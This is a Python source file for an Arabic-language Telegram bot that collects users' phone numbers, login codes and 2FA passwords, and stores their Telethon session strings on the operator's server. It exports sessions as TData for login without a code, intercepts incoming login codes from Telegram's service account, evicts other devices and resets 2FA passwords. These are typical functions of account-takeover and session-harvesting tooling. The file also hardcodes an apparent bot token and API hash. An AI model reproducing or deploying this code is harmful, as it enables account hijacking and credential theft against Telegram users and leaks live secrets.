import os
import json
import asyncio
import time
import logging
import threading
import zipfile
import shutil
from http.server import BaseHTTPRequestHandler, HTTPServer
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient, events, functions
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# محاولة استيراد opentele
try:
    os.environ["QT_QPA_PLATFORM"] = "offscreen" # ضروري لـ Render
    from opentele.api import API
    from opentele.td import TDesktop
    OPENTELE_AVAILABLE = True
except ImportError:
    OPENTELE_AVAILABLE = False

# --- الإعدادات المباشرة ---
API_ID = 35980161
API_HASH = 'd879538c1b65ee6aa57ac3b4ce4b63d3'
BOT_TOKEN = '8615971361:AAHI51Wd-fj5xKcUwbqyJxbgA7CuuSjebIY'
ADMIN_ID = 8718973896

STORAGE_CHANNEL_ID = 0 
DB_FILE = 'sessions.json'
active_clients = {}  
radar_mode = {}      
user_states = {}     
app = None

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    class SimpleHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"VANTA Bot is Alive")
        def do_HEAD(self):
            self.send_response(200)
            self.end_headers()
    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
    server.serve_forever()

threading.Thread(target=run_web_server, daemon=True).start()

db = {}

async def load_db_from_telegram():
    global db
    if STORAGE_CHANNEL_ID == 0:
        if os.path.exists(DB_FILE):
            try:
                with open(DB_FILE, 'r') as f: db = json.load(f)
            except: pass
        return
    # ... (كود سحب الداتا من القناة كما هو) ...

def save_db():
    with open(DB_FILE, 'w') as f: json.dump(db, f, ensure_ascii=False, indent=4)

def btn(text, callback_data=None, url=None, style=None):
    kwargs = {"text": text}
    if callback_data: kwargs["callback_data"] = callback_data
    if url: kwargs["url"] = url
    if style:
        try: return InlineKeyboardButton(**kwargs, style=style)
        except TypeError: pass
    return InlineKeyboardButton(**kwargs)

def global_otp_handler(event):
    for user_id, clients in active_clients.items():
        for phone, client in clients.items():
            if client == event.client:
                if radar_mode.get(user_id) == phone:
                    code = event.raw_text
                    asyncio.create_task(app.bot.send_message(chat_id=user_id, text=f"🔑 **الرمز:** `{code}`", parse_mode="Markdown"))
                    radar_mode.pop(user_id, None)
                return

async def start_telethon_client(user_id, phone, session_str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized(): return None
        client.add_event_handler(global_otp_handler, events.NewMessage(from_users=777000))
        return client
    except: return None

async def load_all_clients():
    for user_id_str, sessions in list(db.items()):
        user_id = int(user_id_str)
        if user_id not in active_clients: active_clients[user_id] = {}
        for phone, data in list(sessions.items()):
            session_str = data.get("session") if isinstance(data, dict) else data
            client = await start_telethon_client(user_id, phone, session_str)
            if client: active_clients[user_id][phone] = client

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [btn("➕ إضافة حساب جديد", "add_account", style="success")],
        [btn("📱 حساباتي", "my_accounts", style="primary")]
    ]
    await update.message.reply_text("أهلاً بك يا سيدي.\nاختر ما تريد:", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "main_menu":
        user_states.pop(user_id, None)
        keyboard = [
            [btn("➕ إضافة حساب جديد", "add_account", style="success")],
            [btn("📱 حساباتي", "my_accounts", style="primary")]
        ]
        await query.edit_message_text("القائمة الرئيسية:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "add_account":
        user_states[user_id] = "waiting_phone"
        await query.edit_message_text("أرسل رقم هاتفك:")
    
    elif data == "my_accounts":
        user_sessions = db.get(str(user_id), {})
        if not user_sessions:
            await query.edit_message_text("ليس لديك حسابات.")
            return
        keyboard = []
        for phone, info in user_sessions.items():
            label = info.get("label", phone) if isinstance(info, dict) else phone
            keyboard.append([btn(f"📱 {label}", f"view_{phone}", style="primary")])
        keyboard.append([btn("🔙 رجوع", "main_menu", style="danger")])
        await query.edit_message_text("اختر حساباً:", reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data.startswith("view_"):
        phone = data.split("_", 1)[1]
        keyboard = [
            [btn("📁 استخراج TData (للدخول بدون كود)", f"export_{phone}", style="success")],
            [btn("💻 إدارة الأجهزة النشطة", f"devices_{phone}", style="primary")],
            [btn("🔐 تغيير كلمة سر (2FA)", f"set2fa_{phone}", style="danger")],
            [btn("⏳ انتظار رمز الدخول (رادار)", f"radar_{phone}", style="success")],
            [btn("🔙 رجوع", "my_accounts", style="primary")]
        ]
        await query.edit_message_text(f"الحساب: `{phone}`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("export_"):
        phone = data.split("_", 1)[1]
        session_str = db[str(user_id)][phone]["session"]
        await query.edit_message_text("⏳ جاري استخراج TData... الرجاء الانتظار.")
        
        if not OPENTELE_AVAILABLE:
            # الخطة البديلة إذا لم تكن opentele مثبتة
            filename = f"session_{phone}.txt"
            with open(filename, 'w') as f: f.write(session_str)
            await query.message.reply_document(document=open(filename, 'rb'), filename=filename, caption="⚠️ تم إرسال ملف الجلسة العادي (لأن مكتبة opentele غير متوفرة على السيرفر). يمكنك وضع هذا النص في أي أداة لتحويل الجلسات.")
            os.remove(filename)
            return

        try:
            temp_dir = f"tdata_{user_id}_{phone}"
            os.makedirs(temp_dir, exist_ok=True)
            
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            await client.connect()
            
            tdesk = await TDesktop.FromTelethon(client)
            tdata_path = os.path.join(temp_dir, "tdata")
            await tdesk.SaveTData(tdata_path)
            await client.disconnect()
            
            zip_filename = f"tdata_{phone}"
            shutil.make_archive(zip_filename, 'zip', tdata_path)
            
            with open(f"{zip_filename}.zip", 'rb') as f:
                await query.message.reply_document(
                    document=f,
                    filename=f"tdata_{phone}.zip",
                    caption=f"📁 **ملف TData جاهز!**\n\n1. أغلق تلغرام ديسكتوب.\n2. احذف مجلد tdata القديم.\n3. فك ضغط الملف وضع مجلد tdata مكانه.\n4. افتح التلغرام (سيدخل فوراً بدون كود)."
                )
            
            shutil.rmtree(temp_dir, ignore_errors=True)
            os.remove(f"{zip_filename}.zip")
            
        except Exception as e:
            await query.edit_message_text(f"❌ حدث خطأ أثناء الاستخراج: {e}")

    elif data.startswith("devices_"):
        phone = data.split("_", 1)[1]
        client = active_clients.get(user_id, {}).get(phone)
        if not client:
            await query.edit_message_text("❌ الحساب غير متصل.")
            return
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            keyboard = []
            text = "💻 **الأجهزة النشطة:**\n\n"
            for auth in result.authorizations:
                device_name = f"{auth.device_model} - {auth.app_name}"
                if auth.current: device_name += " (البوت)"
                text += f"• {device_name}\n"
                if not auth.current:
                    keyboard.append([btn(f"❌ طرد: {auth.device_model}", f"kill_{phone}_{auth.hash}", style="danger")])
            keyboard.append([btn("🔙 رجوع", f"view_{phone}", style="primary")])
            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            await query.edit_message_text(f"❌ خطأ: {e}")

    elif data.startswith("kill_"):
        parts = data.split("_")
        phone, auth_hash = parts[1], int(parts[2])
        client = active_clients.get(user_id, {}).get(phone)
        try:
            await client(functions.account.ResetAuthorizationRequest(hash=auth_hash))
            await query.answer("✅ تم طرد الجهاز!", show_alert=True)
            await button_handler(update, context)
        except Exception as e:
            if "FRESH_RESET" in str(e):
                await query.answer("⚠️ لا يمكنك الطرد في أول 24 ساعة.", show_alert=True)
            else:
                await query.answer(f"❌ خطأ: {e}", show_alert=True)

    elif data.startswith("set2fa_"):
        phone = data.split("_", 1)[1]
        user_states[user_id] = f"waiting_2fa:{phone}"
        await query.edit_message_text("🔐 أرسل كلمة المرور الجديدة (2FA):")

    elif data.startswith("radar_"):
        phone = data.split("_", 1)[1]
        radar_mode[user_id] = phone
        await query.edit_message_text(f"✅ الرادار يعمل الآن.")

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_states.get(user_id)
    if not state: return
    text = update.message.text or ""
    
    if state.startswith("waiting_2fa:"):
        phone = state.split(":", 1)[1]
        client = active_clients.get(user_id, {}).get(phone)
        try:
            await client.edit_2fa(new_password=text.strip())
            await update.message.reply_text("✅ تم تعيين كلمة المرور (2FA) بنجاح.")
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
        user_states.pop(user_id, None)
        return

    if state == "waiting_phone":
        phone = text.strip()
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            await client.send_code_request(phone)
            user_states[user_id] = f"waiting_code:{phone}"
            if user_id not in active_clients: active_clients[user_id] = {}
            active_clients[user_id][f"temp_{phone}"] = client
            await update.message.reply_text(f"✅ تم إرسال الكود. أرسله هنا:")
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            user_states.pop(user_id, None)

    elif state.startswith("waiting_code:"):
        phone = state.split(":", 1)[1]
        code = text.strip()
        client = active_clients.get(user_id, {}).get(f"temp_{phone}")
        try:
            await client.sign_in(phone, code)
            session_str = StringSession.save(client.session)
            if str(user_id) not in db: db[str(user_id)] = {}
            db[str(user_id)][phone] = {"session": session_str, "label": phone, "added_at": time.strftime("%Y-%m-%d %H:%M")}
            save_db()
            active_clients[user_id].pop(f"temp_{phone}", None)
            active_clients[user_id][phone] = client
            client.add_event_handler(global_otp_handler, events.NewMessage(from_users=777000))
            await update.message.reply_text(f"🔥 تم الحفظ بنجاح!")
            user_states.pop(user_id, None)
        except SessionPasswordNeededError:
            user_states[user_id] = f"waiting_password:{phone}"
            await update.message.reply_text("🔐 الحساب محمي بكلمة مرور (2FA). أرسلها:")
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            user_states.pop(user_id, None)

    elif state.startswith("waiting_password:"):
        phone = state.split(":", 1)[1]
        password = text.strip()
        client = active_clients.get(user_id, {}).get(f"temp_{phone}")
        try:
            await client.sign_in(password=password)
            session_str = StringSession.save(client.session)
            if str(user_id) not in db: db[str(user_id)] = {}
            db[str(user_id)][phone] = {"session": session_str, "label": phone, "added_at": time.strftime("%Y-%m-%d %H:%M")}
            save_db()
            active_clients[user_id].pop(f"temp_{phone}", None)
            active_clients[user_id][phone] = client
            client.add_event_handler(global_otp_handler, events.NewMessage(from_users=777000))
            await update.message.reply_text("🔥 تم الحفظ بنجاح (2FA)!")
            user_states.pop(user_id, None)
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            user_states.pop(user_id, None)

async def main():
    global app
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler((filters.TEXT | filters.Document.ALL) & ~filters.COMMAND, message_handler))
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    logger.info("Loading saved sessions...")
    await load_db_from_telegram()
    await load_all_clients()
    logger.info("Bot is fully operational!")
    await asyncio.Event().wait()

if __name__ == '__main__':
    asyncio.run(main())
